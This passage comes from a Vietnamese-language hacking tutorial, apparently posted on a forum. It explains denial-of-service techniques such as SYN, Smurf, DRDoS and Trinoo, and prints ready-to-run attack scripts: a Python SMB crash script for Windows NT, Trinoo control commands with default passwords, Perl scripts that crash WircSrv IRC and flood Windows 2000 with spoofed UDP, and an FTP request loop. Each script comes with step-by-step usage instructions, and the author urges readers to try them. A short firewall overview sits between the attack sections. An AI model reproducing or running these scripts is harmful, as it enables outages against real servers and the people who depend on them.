sẽ được chia ra thành các mảnh nhỏ ở hệ thống nguồn, mỗi mảnh đều phải có một giá trị offset nhất định để xác định vị trí của mảnh đó trong gói dữ liệu được chuyển đi. Khi các mảnh này đến hệ thống đích, hệ thống đích sẽ dựa vào giá trị offset để sắp xếp các mảnh lại với nhau theo thứ tự đúng như ban đầu . Lợi dụng sơ hở đó , ta chỉ cần gởi đến hệ thống đích một loạt gói packets với giá trị offset chồng chéo lên nhau. Hệ thống đích sẽ không thể nào sắp xếp lại các packets này, nó không điều khiển được và có thể bị crash, reboot hoặc ngừng hoạt động nếu số lượng gói packets với giá trị offset chồng chéo lên nhau quá lớn !<br/><br/> d . ) SYN Attack :<br/><br/> _ Trong SYN Attack, hacker sẽ gởi đến hệ thống đích một loạt SYN packets với địa chỉ ip nguồn không có thực. Hệ thống đích khi nhận được các SYN packets này sẽ gởi trở lại các địa chỉ không có thực đó và chờ đợI để nhận thông tin phản hồi từ các địa chỉ ip giả . Vì đây là các địa chỉ ip không có thực, nên hệ thống đích sẽ sẽ chờ đợi vô ích và còn đưa các "request" chờ đợi này vào bộ nhớ , gây lãng phí một lượng đáng kể bộ nhớ trên máy chủ mà đúng ra là phải dùng vào việc khác thay cho phải chờ đợi thông tin phản hồi không có thực này . Nếu ta gởi cùng một lúc nhiều gói tin có địa chỉ IP giả như vậy thì hệ thống sẽ bị quá tải dẫn đến bị crash hoặc boot máy tính . == &gt; ném đá dấu tay .<br/><br/> e . ) Land Attack :<br/><br/> _ Land Attack cũng gần giống như SYN Attack, nhưng thay vì dùng các địa chỉ ip không có thực, hacker sẽ dùng chính địa chỉ ip của hệ thống nạn nhân. Điều này sẽ tạo nên một vòng lặp vô tận giữa trong chính hệ thống nạn nhân đó, giữa một bên cần nhận thông tin phản hồi còn một bên thì chẳng bao giờ gởi thông tin phản hồi đó đi cả . == &gt; Gậy ông đập lưng ông .<br/><br/> f . ) Smurf Attack :<br/><br/> _Trong Smurf Attack, cần có ba thành phần: hacker (người ra lệnh tấn công), mạng khuếch đại (sẽ nghe lệnh của hacker) và hệ thống của nạn nhân. Hacker sẽ gởi các gói tin ICMP đến địa chỉ broadcast của mạng khuếch đại. Điều đặc biệt là các gói tin ICMP packets này có địa chỉ ip nguồn chính là địa chỉ ip của nạn nhân . Khi các packets đó đến được địa chỉ broadcast của mạng khuếch đại, các máy tính trong mạng khuếch đại sẽ tưởng rằng máy tính nạn nhân đã gởi gói tin ICMP packets đến và chúng sẽ đồng loạt gởi trả lại hệ thống nạn nhân các gói tin phản hồi ICMP packets. Hệ thống máy nạn nhân sẽ không chịu nổi một khối lượng khổng lồ các gói tin này và nhanh chóng bị ngừng hoạt động, crash hoặc reboot. Như vậy, chỉ cần gởi một lượng nhỏ các gói tin ICMP packets đi thì hệ thống mạng khuếch đại sẽ khuếch đại lượng gói tin ICMP packets này lên gấp bộI . Tỉ lệ khuếch đại phụ thuộc vào số mạng tính có trong mạng khuếch đạI . Nhiệm vụ của các hacker là cố chiếm được càng nhiều hệ thống mạng hoặc routers cho phép chuyển trực tiếp các gói tin đến địa chỉ broadcast không qua chỗ lọc địa chỉ nguồn ở các đầu ra của gói tin . Có được các hệ thống này, hacker sẽ dễ dàng tiến hành Smurf Attack trên các hệ thống cần tấn công . == &gt; một máy làm chẳng si nhê , chục máy chụm lại ta đành chào thua .<br/><br/> g . ) UDP Flooding :<br/><br/> _ Cách tấn công UDP đòi hỏi phải có 2 hệ thống máy cùng tham gia. Hackers sẽ làm cho hệ thống của mình đi vào một vòng lặp trao đổi các dữ liệu qua giao thức UDP. Và giả mạo địa chỉ ip của các gói tin là địa chỉ loopback ( 127.0.0.1 ) , rồi gởi gói tin này đến hệ thống của nạn nhân trên cổng UDP echo ( 7 ). Hệ thống của nạn nhân sẽ trả lời lại các messages do 127.0.0.1( chính nó ) gởi đến , kết quả là nó sẽ đi vòng một vòng lặp vô tận. Tuy nhiên, có nhiều hệ thống không cho dùng địa chỉ loopback nên hacker sẽ giả mạo một địa chỉ ip của một máy tính nào đó trên mạng nạn nhân và tiến hành ngập lụt UDP trên hệ thống của nạn nhân . Nếu bạn làm cách này không thành công thì chính máy của bạn sẽ bị đấy .<br/><br/> h . ) Tấn công DNS :<br/><br/> _ Hacker có thể đổi một lối vào trên Domain Name Server của hệ thống nạn nhân rồi cho chỉ đến một website nào đó của hacker. Khi máy khách yêu cầu DNS phân tích địa chỉ bị xâm nhập thành địa chỉ ip, lập tức DNS ( đã bị hacker thay đổi cache tạm thờI ) sẽ đổi thành địa chỉ ip mà hacker đã cho chỉ đến đó . Kết quả là thay vì phải vào trang Web muốn vào thì các nạn nhân sẽ vào trang Web do chính hacker tạo ra . Một cách tấn công từ chối dịch vụ thật hữu hiệu !.<br/><br/> g . ) Distributed DoS Attacks ( DDos ) :<br/><br/> _ DDoS yêu cầu phải có ít nhất vài hackers cùng tham gia. Đầu tiên các hackers sẽ cố thâm nhập vào các mạng máy tính được bảo mật kém, sau đó cài lên các hệ thống này chương trình DDoS server. Bây giờ các hackers sẽ hẹn nhau đến thời gian đã định sẽ dùng DDoS client kết nối đến các DDoS servers, sau đó đồng loạt ra lệnh cho các DDoS servers này tiến hành tấn công DDoS đến hệ thống nạn nhân .<br/><br/> h . ) DRDoS ( The Distributed Reflection Denial of Service Attack ) :<br/><br/> _ Đây có lẽ là kiểu tấn công lợi hại nhất và làm boot máy tính của đối phương nhanh gọn nhất . Cách làm thì cũng tương tự như DDos nhưng thay vì tấn công bằng nhiều máy tính thì ngườI tấn công chỉ cần dùng một máy tấn công thông qua các server lớn trên thế giới . Vẫn với phương pháp giả mạo địa chỉ IP của victim , kẻ tấn công sẽ gởi các gói tin đến các server mạnh nhất , nhanh nhất và có đường truyền rộng nhất như Yahoo .v.v… , các server này sẽ phản hồi các gói tin đó đến địa chỉ của victim . Việc cùng một lúc nhận được nhiều gói tin thông qua các server lớn này sẽ nhanh chóng làm nghẽn đường truyền của máy tính nạn nhân và làm crash , reboot máy tính đó . Cách tấn công này lợi hại ở chỗ chỉ cần một máy có kết nối Internet đơn giản với đường truyền bình thường cũng có thể đánh bật được hệ thống có đường truyền tốt nhất thế giớI nếu như ta không kịp ngăn chặn . Trang Web HVA của chúng ta cũng bị DoS vừa rồi bởi cách tấn công này đấy .<br/><br/> <b>40 . ) Kỹ thuật DoS Web bằng Python :</b><br/><br/> _ Kỹ thuật này chỉ có thể sử dụng duy nhất trên WinNT , và bạn cần phải có thời gian thì máy tính của nạn nhân mới bị down được .<br/> _ Bạn hãy download Pyphon tại<span class="link"> http://www.python.org/</span> để sử dụng .<br/> _ Bạn hãy save đoạn mã sau lên file rfpoison.py .<br/><br/><br/> <blockquote>CODE<br/> import string<br/> import struct<br/> from socket import *<br/> import sys<br/> def a2b(s):<br/> bytes = map(lambda x: string.atoi(x, 16),<br/> string.split(s))<br/> data = string.join(map(chr, bytes), '')<br/> return data<br/> def b2a(s):<br/> bytes = map(lambda x: '%.2x' % x, map(ord, s))<br/> return string.join(bytes, ' ')<br/><br/> # Yêu cầu tập hợp NBSS<br/> nbss_session = a2b("""<br/> 81 00 00 48 20 43 4b 46 44 45<br/> 4e 45 43 46 44 45 46 46 43 46 47 45 46 46 43 43<br/> 41 43 41 43 41 43 41 43 41 43 41 00 20 45 48 45<br/> 42 46 45 45 46 45 4c 45 46 45 46 46 41 45 46 46<br/> 43 43 41 43 41 43 41 43 41 43 41 41 41 00 00 00<br/> 00 00<br/> """)<br/><br/> # Tạo SMB<br/> crud = (<br/> # Yêu cầu SMBnegprot<br/> """<br/> ff 53 4d 42 72 00<br/> 00 00 00 08 01 00 00 00 00 00 00 00 00 00 00 00<br/> 00 00 00 00 f4 01 00 00 01 00 00 81 00 02 50 43<br/> 20 4e 45 54 57 4f 52 4b 20 50 52 4f 47 52 41 4d<br/> 20 31 2e 30 00 02 4d 49 43 52 4f 53 4f 46 54 20<br/> 4e 45 54 57 4f 52 4b 53 20 31 2e 30 33 00 02 4d<br/> 49 43 52 4f 53 4f 46 54 20 4e 45 54 57 4f 52 4b<br/> 53 20 33 2e 30 00 02 4c 41 4e 4d 41 4e 31 2e 30<br/> 00 02 4c 4d 31 2e 32 58 30 30 32 00 02 53 61 6d<br/> 62 61 00 02 4e 54 20 4c 41 4e 4d 41 4e 20 31 2e<br/> 30 00 02 4e 54 20 4c 4d 20 30 2e 31 32 00<br/> """,<br/> # Yêu cầu setup SMB X<br/> """<br/> ff 53 4d 42 73 00<br/> 00 00 00 08 01 00 00 00 00 00 00 00 00 00 00 00<br/> 00 00 00 00 f4 01 00 00 01 00 0d ff 00 00 00 ff<br/> ff 02 00 f4 01 00 00 00 00 01 00 00 00 00 00 00<br/> 00 00 00 00 00 17 00 00 00 57 4f 52 4b 47 52 4f<br/> 55 50 00 55 6e 69 78 00 53 61 6d 62 61 00<br/> """,<br/> # Yêu cầu SMBtconX<br/> """<br/> ff 53 4d 42 75 00<br/> 00 00 00 08 01 00 00 00 00 00 00 00 00 00 00 00<br/> 00 00 00 00 f4 01 00 08 01 00 04 ff 00 00 00 00<br/> 00 01 00 17 00 00 5c 5c 2a 53 4d 42 53 45 52 56<br/> 45 52 5c 49 50 43 24 00 49 50 43 00<br/> """,<br/> # Yêu cầu khởI tạo SMBnt X<br/> """<br/> ff 53 4d 42 a2 00<br/> 00 00 00 08 01 00 00 00 00 00 00 00 00 00 00 00<br/> 00 00 00 08 f4 01 00 08 01 00 18 ff 00 00 00 00<br/> 07 00 06 00 00 00 00 00 00 00 9f 01 02 00 00 00<br/> 00 00 00 00 00 00 00 00 00 00 03 00 00 00 01 00<br/> 00 00 00 00 00 00 02 00 00 00 00 08 00 5c 73 72<br/> 76 73 76 63 00<br/> """,<br/> # yêu cầu biên dịch SMB<br/> """<br/> ff 53 4d 42 25 00<br/> 00 00 00 08 01 00 00 00 00 00 00 00 00 00 00 00<br/> 00 00 00 08 f4 01 00 08 01 00 10 00 00 48 00 00<br/> 00 48 00 00 00 00 00 00 00 00 00 00 00 00 00 4c<br/> 00 48 00 4c 00 02 00 26 00 00 08 51 00 5c 50 49<br/> 50 45 5c 00 00 00 05 00 0b 00 10 00 00 00 48 00<br/> 00 00 01 00 00 00 30 16 30 16 00 00 00 00 01 00<br/> 00 00 00 00 01 00 c8 4f 32 4b 70 16 d3 01 12 78<br/> 5a 47 bf 6e e1 88 03 00 00 00 04 5d 88 8a eb 1c<br/> c9 11 9f e8 08 00 2b 10 48 60 02 00 00 00<br/> """,<br/> # SMBtrans Request<br/> """<br/> ff 53 4d 42 25 00<br/> 00 00 00 08 01 00 00 00 00 00 00 00 00 00 00 00<br/> 00 00 00 08 f4 01 00 08 01 00 10 00 00 58 00 00<br/> 00 58 00 00 00 00 00 00 00 00 00 00 00 00 00 4c<br/> 00 58 00 4c 00 02 00 26 00 00 08 61 00 5c 50 49<br/> 50 45 5c 00 00 00 05 00 00 03 10 00 00 00 58 00<br/> 00 00 02 00 00 00 48 00 00 00 00 00 0f 00 01 00<br/> 00 00 0d 00 00 00 00 00 00 00 0d 00 00 00 5c 00<br/> 5c 00 2a 00 53 00 4d 00 42 00 53 00 45 00 52 00<br/> 56 00 45 00 52 00 00 00 00 00 01 00 00 00 01 00<br/> 00 00 00 00 00 00 ff ff ff ff 00 00 00 00<br/> """<br/> )<br/> crud = map(a2b, crud)<br/> def smb_send(sock, data, type=0, flags=0):<br/> d = struct.pack('!BBH', type, flags, len(data))<br/> #print 'send:', b2a(d+data)<br/> sock.send(d+data)<br/> def smb_recv(sock):<br/> s = sock.recv(4)<br/> assert(len(s) == 4)<br/> type, flags, length = struct.unpack('!BBH', s)<br/> data = sock.recv(length)<br/> assert(len(data) == length)<br/> #print 'recv:', b2a(s+data)<br/> return type, flags, data<br/> def nbss_send(sock, data):<br/> sock.send(data)<br/> def nbss_recv(sock):<br/> s = sock.recv(4)<br/> assert(len(s) == 4)<br/> return s<br/> def main(host, port=139):<br/> s = socket(AF_INET, SOCK_STREAM)<br/> s.connect(host, port)<br/> nbss_send(s, nbss_session)<br/> nbss_recv(s)<br/> for msg in crud[:-1]:<br/> smb_send(s, msg)<br/> smb_recv(s)<br/> smb_send(s, crud[-1]) # no response to this<br/> s.close()<br/> if __name__ == '__main__':<br/> print 'Sending poison...',<br/> main(sys.argv[1])<br/> print 'done.' &nbsp;
</blockquote><br/><br/><br/> Để có thể làm down được server của đối phương bạn cần phải có thời gian DoS , nếu không có điều kiện chờ đợi tốt nhất bạn không nên sử dụng cách này . Nhưng “vọc” thử cho biết thì được đúng không ?<br/><br/> <b>41 . ) Tấn công DDoS thông qua Trinoo : </b><br/> _ Bạn đã biết DDoS attack là gì rồi phải không ? Một cuộc tấn công DDoS bằng Trinoo được thực hiện bởi một kết nối của Hacker Trinoo Master và chỉ dẫn cho Master để phát động một cuộc tấn công DDoS đến một hay nhiều mục tiêu. Trinoo Master sẽ liên lạc với những Deadmons đưa những địa chỉ được dẫn đến để tấn công một hay nhiều mục tiêu trong khoảng thời gian xác định .<br/> _ Cả Master và Deamon đều được bảo vệ bằng Passwd . chỉ khi chúng ta biết passwd thì mới có thể điều khiển được chúng , điều này không có gì khó khăn nếu chúng ta là chủ nhân thực sự của chúng . Những passwd này thường được mã hoá và bạn có thể thiết lập khi biên dịch Trinoo từ Source -----&gt; Binnary. Khi được chạy , Deadmons sẽ hiện ra một dấu nhắc và chờ passwd nhập vào , nếu passwd nhập sai nó sẽ tự động thoát còn nếu passwd được nhập đúng thì nó sẽ tự động chạy trên nền của hệ thống .<br/><br/> attacker$ telnet 10.0.0.1 27665<br/> Trying 10.0.0.1<br/> Connected to 10.0.0.1<br/> Escape character is '^]'.<br/> kwijibo<br/> Connection closed by foreign host. &lt; == Bạn đã nhập sai<br/><br/><br/> attacker$ telnet 10.0.0.1 27665<br/> Trying 10.0.0.1<br/> Connected to 10.0.0.1<br/> Escape character is '^]'.<br/> betaalmostdone<br/> trinoo v1.07d2+f3+c..[rpm8d/cb4Sx/]<br/> trinoo&gt; &lt; == bạn đã vào được hệ thống trinoo<br/><br/> _ Đây là vài passwd mặc định :<br/><br/> “l44adsl": pass của trinoo daemon .<br/> "gorave": passwd của trinoo master server khi startup .<br/> "betaalmostdone": passwd điều khiển từ xa chung cho trinoo master .<br/> "killme": passwd trinoo master điều khiển lệnh "mdie" .<br/><br/> _ Đây là một số lệnh dùng để điều khiển Master Server:<br/><br/><br/><br/> <blockquote>CODE<br/> die------------------------------------------------------------Shutdown.<br/> quit------------------------------------------------------------Log off.<br/> mtimer N----------------------------------------------------Đặt thờI gian để tấn công DoS , vớI N nhận giá trị từ 1--&gt; 1999 giây .<br/> dos IP-------------------------------------------------------Tấn công đến một địa chỉ IP xác định .<br/> mdie pass---------------------------------------------------Vô hiệu hoá tất cả các Broadcast , nếu như passwd chính xác . Một lệnh đưọc gửi tới ("d1e l44adsl") Broadcast để Shutdown chúng . Một passwd riêng biệt sẽ được đặt cho mục này<br/> mping--------------------------------------------------------Gửi một lệnh ping tới ("png l44adsl") c¸c Broadcast.<br/> mdos &lt;ip1:ip2..&gt; ------------------------------------------Send nhiều lênh DOS ("xyz l44adsl 123:ip1:ip2") đến các Broadcast.<br/> info-------------------------------------------------------------Hiển thị thông tin về Trinoo .<br/> msize----------------------------------------------------------Đặt kích thước đệm cho những gói tin được send đi trong suốt thờI gian DoS.<br/> nslookup host----------------------------------------------Xác định tên thiết bị của Host mà Master Trinoo đang chạy .<br/> usebackup---------------------------------------------------Chuyển tớI các file Broadcast sao lưu được tạo bởi lệnh “killdead”.<br/> bcast-----------------------------------------------------------Liệt kê danh sách tất cả các Broadcast có thể khai thác .<br/> help [cmd] ---------------------------------------------------Đưa ra danh sách các lệnh .<br/> mstop-----------------------------------------------------------Ngừng lại các cuốc tấn công DOS .&nbsp;
</blockquote><br/><br/> _ Đây là một số lệnh dùng để điều khiển Trinoo Deadmons:<br/><br/><br/> <i>CODE<br/> aaa pass IP----------------------------------------------------Tấn công đến địa chỉ IP đã xác định . GửI gói tin UDP (0-65534) đến cổng của UDP của địa chỉ IP đã xác định trong một khoảng thời gian xác định được mặc định là 120s hay từ 1--&gt;1999 s .<br/> bbb pass N-----------------------------------------------------Đặt thờI gian giới hạn cho các cuộc tấn công DOS .<br/> Shi pass--------------------------------------------------------Gửi chuỗi “*HELLO*” tới dánh sách Master Server đã được biên dịch trong chương trình trên cổng 31335/UDP.<br/> png pass-------------------------------------------------------Send chuỗi “Pong” tớI Master Server phát hành các lệnh điều khiển trên cổng 31335/UDP.<br/> die pass--------------------------------------------------------Shutdown Trinoo.<br/> rsz N------------------------------------------------------------Là kích thước của bộ đệm được dùng để tấn công , nó được tính bằng byte .<br/> xyz pass 123:ip1:ip3----------------------------------------tấn công DOS nhiều mục tiêu cùng lúc .</i><br/><br/><br/> <i>( Dựa theo hướng dẫn của huynh Binhnx2000 )</i><br/><br/> Còn nhiều đoạn mã và cách ứng dụng để DoS lắm , các bạn chịu khó tìm hiểu thêm nhé . Nhưng đừng tấn công lung tung , nhất là server của HVA , coi chừng không thu được hiệu quả mà còn bị lock nick nữa đó . Thân .<br/><br/> GOODLUCK!!!!!!!!!!!!!!!!<br/><br/> <i>Hết phần 6</i><br/><br/><br/><br/> <font size='+2'><b>Firewall</b></font><br/> Chức năng chính của firewall là kiểm soát luồng thông tin từ giữa Internet và Intranet.Thiết lập cơ chế điều khiển dòng thông tin giữa mạng bên trong (Intranet) vàmạng Internet.VD:<br/> • Cho phép hoặc không cho phép những dịch vụ truy cập ra ngoài (Từ Intranet ra Internet) hay từ ngoài truy cập vào trong (Internet vào Intranet).<br/> • Theo dõi luồng dữ liệu giữa Internet và Intranet.<br/> • Kiểm soát địa chỉ truy cập , cấm địa chỉ nào đó truy cập.<br/> • Kiểm soát người sử dụng và việc truy cập của người sử dụng.<br/> • Kiểm soát nội dung thông tin lưu chuyển trên mạng.<br/> Tuy nhiên firewall vẫn có một số mặt hạn chế :<br/> • Firewall không đủ thông minh như con người để có thể đọc hiểu từng lọai thông tin và phân tích nội dung tốt hay xấu của nó.Firewall chỉ có thể ngăn chặn sự xâm nhập của những nguồn thông tin không mong muốn nhưng phải xác định rõ các địa chỉ truy cập.<br/> • Không thể ngăn cản những cuộc tấn công không đi qua nó , những cuộc tấn công bằng dữ liệu (data-drivent attack).<br/> • Không thể rà quét virus máy tính trên những dũ liệu được chuyển qua nó vì sự gia tăng nhanh chóng của các loại virus mới và có nhiều cách mã hoá dữ liệu để thoát khỏi sự kiểm soát của firewall<br/> Một số phần mềm firewall :<br/><br/> <b>1-SMTP Gateway-Proxy Server cho cổng SMTP </b>:<br/><br/> Chương trình SMTP Gateway được xây dựng trên cơ sở sử dụng 2 phần mềm Smap và Smapd ,dùng để chống lại sự truy cập thông qua giao thức SMTP.Nguyên lý thực hiện là chặn trước chương trình Mail Server nguyên thủy của hệ thống , không cho phép các hệ thống bên ngoài kết nối tới Mail Server vì ở trong mạng tin cậy của mail server thường có một số quyền ưu tiên khá cao.Trên HĐH Unix , chương trình Mail Server được thực hiện bởi Sendmail (Send mail dùng để làm gì thì coi ở trên).<br/><br/> Khi một hệ thống ở xa kết nối tới cổng SMTP , chương trình smap sẽ dành quyền phục vụ và chuyển tớ thư mục dành riêng và đặt USER-ID ở mức bình thường (không có quyền ưu tiên).Mục đích duy nhất của smap là đối thoại SMTP với các hệ thống khác , thu lượm mail , ghi vào đĩa , ghi nhật kí và kết thúc.Còn đối với Smapd , nó sẽ quét thư mục này thường xuyên , khi phát hiện có mail sẽ chuyển dữ liệu cho Sendmail để phân phát vào hòm thư cá nhân hoặc chuyển tiếp tới các mail server khác .<br/><br/> Như vậy , một user lạ trên mạng sẽ không kết nối được tới Mail Server và tấ cả các thông tin theo đường này đều có thể kiểm soát được .Tuy nhiên nhược điểm của chương trình này là không thể giải quyết những vấn đề như là thư nặc danh hoặc các phương pháp tấn công bằng đường khác.<br/><br/> <b>2-FTP Gateway -Proxy Server dành cho dịch vụ FTP: </b><br/> Proxy Server dành cho dĩch vụ FTP cung cấp khả năng kiểm soát khả năng truy cập vào dịch vụ FTP dựa trên địa chỉ IP và Hostname , và cung cấp quyền điều khiển truy cậo thứ cấp cho phép tuỳ chọn khoá hoặc ghi nhật kí bất kì lệnh FTP nào .Các địa chỉ đích này cũng có thể tuỳ chọn được (cho phép hoặc bị cấm ).Tất cả các sự kết nối và dung lượng dữ liệu chuyển qua đều bị nhật kí ghi lại.<br/><br/> FTP Gateway tự bản thân nó không đe dọa an toành của hệ thống bởi vì nó chạy root tới một hư mục rỗng và không thực hiện bất kì thủ tục input/output file nào ngoài việc đọc file cấu hình của nó .FTP Server chỉ cung cấp dịch vụ FTP mà không quan tâm đến việc ai có quyền hay không có quyền dowload các file .Do vậy việc xác định quyền phải được thiết lập trên FTP Gateway và phải thực hiện trướ khi thực hiện việc upload/download file.<br/><br/> FTP Gateway có thể ngăn ngừa mọi sự xâm nhập vào mạng qua cổng FTP một cách khá linh hoạt (cho phép ngăn cản từng địa chỉ hay toàn bộ mạng) và cũng kiểm soát việc truy cập tới từng khả năng như dowload /upload thông tin.<br/><br/> <b>3-Telnet Gateway-Proxy Server cho Telnet :</b><br/> Telnet Gateway là một proxy server quản lý truy cập mạng dựa trên địa chỉ IP , hostname và cung cấp sự điều khiển truy cập thứ cấp cho phép tuỳ chọn khoá bất kì đích nào. Tất cả các sự kết nối dữ liệu chuyển qua đều được nhật kí ghi lại.Mỗi lần user kết nối tới Telnet Gateway , user phải chọn phương thức kết nối.Telnet Fateway không làm hại tới hệ thống vì nó chỉ hoạt động trong một phạm vi nhất định (được cho phép).VD : Hệ thống sẽ chuyển quyền điều khiển tới một thư mục dành riêng, đồng thời cắm truy cập tới những thư mục và file khác.<br/> Telnet Gateway được sử dụng để kiểm soát các truy cập vào mạng nội bộ.Các truy cập không được phép sẽ không thể thực hiện được một tác vụ nào , còn những truy cập hợp pháp sẽ bị nhật kí ghi lại (thời gian truy cập , những tác vụ …)<br/><br/> <b>4-HTTP Gateway – Proxy Server dành cho Web : </b><br/> 11111111111111111111111111111111111111111111111111111111111111111111111<br/><br/><br/> <font size='+3'><b>Phần 7</b></font><br/><br/> <b>42 . ) Kỹ thuật ấn công DoS vào WircSrv Irc Server v5.07 :</b><br/><br/> _ WircSrv IRC là một Server IRC thông dụng trên Internet ,nó sẽ bị Crash nếu như bị các Hacker gửi một Packet lớn hơn giá trị ( 65000 ký tự ) cho phép đến Port 6667.<br/> Bạn có thể thực hiện việc này bằng cách Telnet đến WircSrv trên Port 6667:<br/><br/> Nếu bạn dùng Unix:<br/><br/> [hellme@die-communitech.net$ telnet irc.example.com 6667<br/> Trying example.com...<br/> Connected to example.com.<br/> Escape character is '^]'.<br/> [buffer]<br/><br/> Windows cũng tương tự:<br/><br/> telnet irc.example.com 6667<br/><br/> Lưu ý: [buffer] là Packet dữ liệu tương đương với 65000 ký tự .<br/> Tuy nhiên , chúng ta sẽ crash nó rất đơn giản bằng đoạn mã sau ( Các bạn hãy nhìn vào đoạn mã và tự mình giải mã những câu lệnh trong đó , đó cũng là một trong những cách tập luyện cho sự phản xạ của các hacker khi họ nghiên cứu . Nào , chúng ta hãy phân tích nó một cách căn bản ):<br/><br/><br/> CODE<br/> #!/usr/bin/perl #&lt; == Đoạn mã này cho ta biết là dùng cho các lệnh trong perl<br/> use Getopt::Std;<br/> use Socket;<br/> getopts('s:', \%args);<br/> if(!defined($args{s})){&usage;}<br/> my($serv,$port,$foo,$number,$data,$buf,$in_addr,$paddr,$proto);<br/> $foo = "A"; # Đây là NOP<br/> $number = "65000"; # Đây là tất cả số NOP<br/> $data .= $foo x $number; # kết quả của $foo times $number<br/> $serv = $args{s}; # lệnh điều khiển server từ xa<br/> $port = 6667; # lệnh điều khiển cổng từ xa , nó được mặc định là 6667<br/> $buf = "$data";<br/> $in_addr = (gethostbyname($serv))[4] || die("Error: $!\n");<br/> $paddr = sockaddr_in($port, $in_addr) || die ("Error: $!\n");<br/> $proto = getprotobyname('tcp') || die("Error: $!\n");<br/> socket(S, PF_INET, SOCK_STREAM, $proto) || die("Error: $!");<br/> connect(S, $paddr) ||die ("Error: $!");<br/> select(S); $| = 1; select(STDOUT);<br/> print S "$buf";<br/> print S "$buf";<br/> print("Data has been successfully sent to $serv\n");<br/> sub usage {die("\n\n Lỗi WircSrv Version 5.07s<br/> có thể tấn công bằng DoS \n gửi 2 64k gói tin đến server làm cho nó crash.\n -s server_ip\n\n");}<br/><br/><br/> Để sử dụng cái mã này , bạn hãy save nó vào một file *.pl , rồI down chương trình activeperl về sài , setup nó rồi vào HĐH DOS bạn chỉ cần gọi file này ra theo lệnh sau :<br/><br/> C:\&gt;perl &lt; đường dẫn đến file *.pl &gt;<br/><br/> ( Đến bây giờ tôi sẽ không bày thật cặn kẽ nữa mà sẽ tăng dần độ khó lên , nếu bạn nào nghiên cứu kỹ các bài trước thì các bạn sẽ làm được dễ dàng thôi )<br/><br/> <b>43 . ) Kỹ thuật tấn công DoS vào máy tính sử dụng HĐH Win2000 :</b><br/><br/> _ Muốn sử dụng được nó , bạn phải có activeperl , rồi sử dụng như hướng dẫn tương tự trên . Save đoạn mã vào file *.pl rồI dùng lệnh perl gọi nó ra :<br/><br/><br/> <blockquote>CODE<br/> #!/usr/bin/perl -w<br/> use Socket;<br/> use Net::RawIP;<br/> use Getopt::Std;<br/><br/> getopts("s:d:p:l:n:v:t:f:T:rL",%o);$ver="0.3a";$0=~s#.*/##;<br/> print"--- $0 v.$ver b/ Nelson Brito / Independent Security Consultant --- ";<br/> $l=$o{'l'}?$o{'l'}+28:800+28;$n=$o{'n'}?$o{'n'}/2:800/2;<br/> $v=$o{'v'}||4;$t=$o{'t'}||1;$f=$o{'f'}||0;$T=$o{'T'}||64;<br/> $p=$o{'p'}?$o{'p'}<img src="/hvaonline/images/smilies/274a01ad7ad7ad7d73d5f0b399ae5db2.gif" border="0" alt="smilie" align="absbottom">getservbyname('isakmp','udp')||die"getservbyname: $! ");<br/><br/> ($o{'s'}&&$o{'d'})||die<br/> " Use: $0 [IP Options] [UDP Options] ",<br/> "IP Options: ",<br/> " -s* Đia chi nguon đe bat chuoc ",<br/> " -d* Đia chi bi tan cong ",<br/> " -v IP Version (def: $v) ",<br/> " -t IP Type of Service (TOS) (def: $t) ",<br/> " -f IP fragementation offset (def: $f) ",<br/> " -T IP Time to Live (TTL) (def: $T) ",<br/> "UDP Options: ",<br/> " -p cong cua may tinh nan nhan (def: $p) ",<br/> " -l chieu dai cua goi tin (def: $l) ",<br/> " -r cai đat du lieu ngau nhien (def: ".") ",<br/> "Generic: ",<br/> " -n So luong goi tin ta muon gui đi (def: $n) ",<br/> " -L gui goi tin lien tuc khong ngung cho đen khi may tinh cua nan nhan bi die he he",<br/> " Bai huong dan cua ANHDENDAY . ";<br/><br/> while($n &gt; 0){<br/> $|=1;print".";$sp=int rand 65535;<br/> $D=$o{'r'}?(chr(int rand 255)) x $l:"." x $l;<br/> $nb=new Net::RawIP({<br/> ip=&gt;<br/> {<br/> version=&gt;$v,<br/> tos=&gt;$t,<br/> ttl=&gt;$T,<br/> frag_off=&gt;$f,<br/> saddr=&gt;$o{'s'},<br/> daddr=&gt;$o{'d'}<br/> },<br/> udp=&gt;<br/> {<br/> source=&gt;$sp,<br/> dest=&gt;$p,<br/> len=&gt;$l,<br/> data=&gt;$D<br/> }<br/> });<br/> $nb-&gt;send;undef $nb;!$o{'L'}&&$n--;<br/> }<br/> print"Finish! ";&nbsp;
</blockquote><br/><br/> _ Khi gọi ra bạn hãy chọn tuỳ chọn đã ghi ở trong đó mà DoS . Nhớ là chỉ dùng cho Win2000 nhé .<br/><br/> <b>44 . ) Kỹ thuật tấn công DoS dễ dàng nhất :</b><br/><br/> _ Tôi thì mỗi lần muốn tấn công bằng DoS đều dùng chương trình này , nó chẳng kén gì cả và dễ thực hiện . Bây giờ tôi sẽ chia sẻ với các bạn .<br/> _ Bạn cần phải có Activeperl ( lại là activepert ) đã cài sẵn , save đoạn mã sau vào file abc.pl :<br/><br/><br/> <blockquote>CODE<br/> #!/usr/bin/perl<br/><br/> use IO::Socket;<br/><br/> sub initiate {<br/> if ($ARGV[0] eq '') {die "Usage: perl abc.pl &lt;host&gt; &lt;port&gt; &lt;username&gt; &lt;password&gt;\nVi du : perl abc.pl 127.0.0.1 21 anonymous me@\n";}<br/><br/> $host = $ARGV[0];<br/> $port = $ARGV[1];<br/> $user = $ARGV[2];<br/> $pass = $ARGV[3];<br/> };<br/><br/> sub connecttoserver {<br/> print("Connect den host: $host\n");<br/> $socket = IO::Socket::INET-&gt;new (PeerAddr =&gt; $host,<br/> PeerPort =&gt; $port,<br/> Proto =&gt; "tcp",<br/> Type =&gt; SOCK_STREAM<br/> ) || die "khong the connect den $host";<br/><br/> print "Connect thanh cong . Loggin vao...\n";<br/> };<br/><br/> sub login {<br/> print "user $user\n";<br/> print $socket "user $user\r\n";<br/> $response = &lt;$socket&gt;;<br/> print "$response\n";<br/><br/> print "pass $pass\n";<br/> print $socket "pass $pass\r\n";<br/> $response = &lt;$socket&gt;;<br/> print "$response\n";<br/><br/> print "Logged in. Dang tan cong DoS doi phuong. Nhan CTRL-C de ngung.\n";<br/> };<br/><br/> sub doit {<br/> for (;; ){<br/> print "retr a:/x\n";<br/> print $socket "retr a:/x\r\n";<br/> $response = &lt;$socket&gt;;<br/> print "$response";<br/> }<br/> }<br/><br/> initiate();<br/> connecttoserver();<br/> login();<br/> doit();&nbsp;
